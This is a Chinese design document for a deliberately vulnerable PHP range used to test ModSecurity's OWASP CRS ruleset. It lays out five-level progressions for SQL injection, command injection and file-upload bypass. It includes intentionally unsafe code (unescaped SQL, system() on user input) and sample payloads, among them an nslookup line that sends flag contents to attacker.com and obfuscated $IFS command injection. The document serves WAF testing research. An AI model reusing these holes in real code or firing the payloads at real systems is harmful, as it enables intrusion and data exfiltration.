# WAF 靶场设计说明

## 一、为什么选择这个架构

### 问题：为什么 WAF 和靶场要分两层？

**答案：职责分离。靶场的价值在于验证 WAF 的能力边界，混合在一起就没意义了。**

```
❌ 错误做法：靶场 PHP 自己做过滤
   if (preg_match('/union/i', $id)) { die('blocked'); }
   → 你测的是你自己的过滤规则，不是 WAF 的能力

✅ 正确做法：靶场零防御，WAF 做所有拦截
   $result = mysqli_query($conn, "SELECT * FROM users WHERE id=$id");
   → 靶场纯粹是漏洞，WAF 能不能拦住是 WAF 的事
```

这对应 CLAUDE.md 的核心要求：
> "靶场只承载原始语义攻击、不内置编码逻辑，保证语义验证结果不受解码环节干扰。"

### 为什么选择 ModSecurity + OWASP CRS？

| 对比维度 | 自研 WAF | ModSecurity CRS |
|---------|---------|-----------------|
| 可信度 | 你自己写的规则，答辩时容易被质疑"规则写太弱" | OWASP 官方维护，业界标准，200+ 现成规则 |
| 深度验证 | 测的是你自己的理解 | 测的是业界公认最强开源 WAF 的边界 |
| 可持续性 | 每次调规则都要改代码 | 一个环境变量 `PARANOIA=4` 就切难度 |
| 答辩说服力 | 一般 | 强——"我绕过了 OWASP CRS Paranoia Level 4" |

### Paranoia Level 4 有多严格？

CRS 有 4 个偏执等级：

- **PL1**（默认）：基础规则，低误报
- **PL2**：中等规则，少量误报
- **PL3**：严格规则，较多误报
- **PL4**：极端严格，**任何看起来可疑的参数都会被拦截**

PL4 的典型行为：
- 检测到 `SELECT` 和数字出现在同一参数 → 拦截
- 检测到任何命令分隔符（`;` `|` `&` `` ` ``）→ 拦截
- 检测到 `<?` 在请求体中 → 拦截
- 一个参数匹配多条规则 → 累计扣分，更容易触发拒绝

## 二、为什么 15 关这样设计

### 2.1 SQL 注入 5 关的递进逻辑

**原则：每关 PHP 代码都是裸拼接，差异在 SQL 上下文。**

```
L1: SELECT * FROM users WHERE id=$id          ← 数字型，最经典
L2: SELECT * FROM users WHERE name='$id'       ← 字符型，需要引号闭合
L3: SELECT * FROM news WHERE title LIKE '%$id%' ← LIKE 上下文，% 干扰
L4: SELECT * FROM users ORDER BY $id           ← ORDER BY 不能用 UNION
L5: SELECT * FROM users WHERE id=$id (无回显)   ← 盲注，无结果集
```

**为什么这样递进？**

WAF 的 SQL 注入检测核心是"认出一个查询片段被篡改"。不同上下文意味着：
- L1：WAF 看到 `UNION SELECT` 直接报警，最容易检测
- L2：多了引号闭合的干扰，但核心特征仍在
- L3：LIKE 的 `%` 通配符分散了 WAF 注意力
- L4：ORDER BY 后的攻击不能用 UNION，只能用 CASE WHEN 布尔盲注——WAF 的 UNION 规则完全失效
- L5：无回显，连布尔信号都没有，WAF 只能靠超时检测，准确度骤降

**答辩时能说什么**：清晰指出 WAF 规则引擎在不同 SQL 语法上下文中的检测能力衰减曲线。

### 2.2 命令注入 5 关的递进逻辑

```
L1: system("ping -c 1 $input")                 ← 分隔符注入，最经典
L2: system("nslookup $input 2>&1")             ← 参数位注入，非命令位
L3: system("echo \"$(cmd $input)\"")           ← 嵌套执行，$() 混淆
L4: putenv("PATH=/tmp"); system($input)         ← 环境变量投毒
L5: system("ping -c 1 $input >/dev/null")      ← 无回显，OOB 外带
```

**为什么这样递进？**

命令注入的核心难点不是"命令被拼接了"，而是"攻击者能控制什么"：

- L1：`;cat /flag.txt` —— 经典分隔符，WAF 规则库直接命中
- L2：`nslookup \`cat /flag.txt\`.attacker.com` —— 注入点在参数位而非命令位，WAF 需要理解 shell 语法树才能识别
- L3：`$($IFS$9cat$IFS/fla*)` —— 嵌套 + 变量混淆，WAF 的字符串匹配失效
- L4：环境变量投毒是**间接攻击**，WAF 建模的是输入→输出的直接映射，环境变量是侧信道
- L5：无回显，攻击走 DNS/HTTP 外带，WAF 难以关联"一个 ping 请求"和"几秒后的一次 DNS 查询"之间的因果关系

**答辩时能说什么**：可以阐述 WAF 在命令注入检测中的"语法树覆盖盲区"——哪些 shell 语法结构 WAF 无法建模。

### 2.3 文件上传 5 关的递进逻辑

```
L1: move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/'.$_FILES['file']['name'])
    → 直接保存，Apache 解析 .php
L2: move_uploaded_file($tmp, "uploads/$dir/$name")
    → 目录可控，路径穿越
L3: 按 Content-Type 分类存储
    → MIME 校验虚假安全感
L4: iconv('UTF-8', 'GBK', $filename) 后保存
    → 编码截断：%c0%ae → 被截断为 .
L5: 先存 .tmp，1秒后 rename 为 .php
    → TOCTOU 条件竞争
```

**为什么这样递进？**

文件上传的核心矛盾是"文件名/内容在不同解析层之间的不一致"：

- L1：内容 `<?php` + 后缀 `.php`，WAF 两层匹配都命中，最容易拦
- L2：路径穿越让文件名在 WAF 看来是 `../../shell.php`，WAF 需要做路径规范化
- L3：Content-Type 和实际内容不一致，WAF 需要双端校验，协议层和内容层解耦
- L4：编码转换造成了"WAF 看到的字节串"和"文件系统最终解释的字节串"不同——这是经典的解析器差异绕过
- L5：条件竞争利用了 WAF 的**同步检测模型**的根本局限——不可能在每次文件重命名时都重新扫描

**答辩时能说什么**：可以从"解析器差异"和"同步检测模型的天然局限"两个角度，系统分析 WAF 文件上传检测的边界。

## 三、与 CLAUDE.md 四类样本产出的关系

靶场本身不产出样本，靶场是**样本的测试验证环境**。四类样本的产出流程：

```
靶场（本计划搭建的测试环境）
  │
  ├── WAF 关闭 ──→ 明文攻击成功 ──→ ① 完整过程用例
  │
  ├── WAF PL4 开启 ──→ 语义变形攻击成功 ──→ ② 语义层 bypass 用例
  │
  ├── WAF PL4 开启 ──→ 编码变形攻击成功 ──→ ③ 编码层 bypass 用例
  │
  └── WAF PL4 开启 ──→ 语义×编码组合成功 ──→ ④ 语义×编码组合用例
```

每类样本需要记录：
- 攻击 payload（原始和变形后）
- WAF 是否拦截（403 或放行）
- 是否拿到 flag（攻击成功标志）
- 绕过的具体原因分析

## 四、为什么不本周做 XSS 和 Log4j2

1. **XSS**：靶场代码是反射输出，ModSecurity CRS PL4 对 XSS 的检测主要靠 `<script>` 标签和事件处理器正则。XSS 的绕过更多是浏览器解析差异层，与 SQLi/CMDi 的"服务端协议层"分析逻辑不同。**分开做可以让两类分析都更深。**

2. **Log4j2**：需要 Java 容器 + JNDI 依赖 + LDAP 服务，是一个独立的技术栈。如果混在 PHP 靶场里会破坏架构的干净性。**第二周单独建一个 Java 靶场更合理。**

3. CLAUDE.md 明确说："宁可 2-3 个场景挖深挖透，不要五个场景蜻蜓点水。" 本周 3 个 PHP 场景 × 5 关 = 15 个精心设计的攻击面，足够输出质量。

## 五、预期可量化指标

完成靶场搭建 + 攻击后，预期产出：
- **15 个明文攻击用例**（WAF 关，100% 成功拿 flag）
- **每个用例 5-10 个语义 bypass 变体**（同义变换绕过）
- **每个用例 8-15 个编码 bypass 变体**（20+ 编码方式叠加）
- **绕过率数据**：每关在 PL1/PL2/PL3/PL4 下的拦截率对比

这些数据直接支撑答辩时的"量化指标"要求。
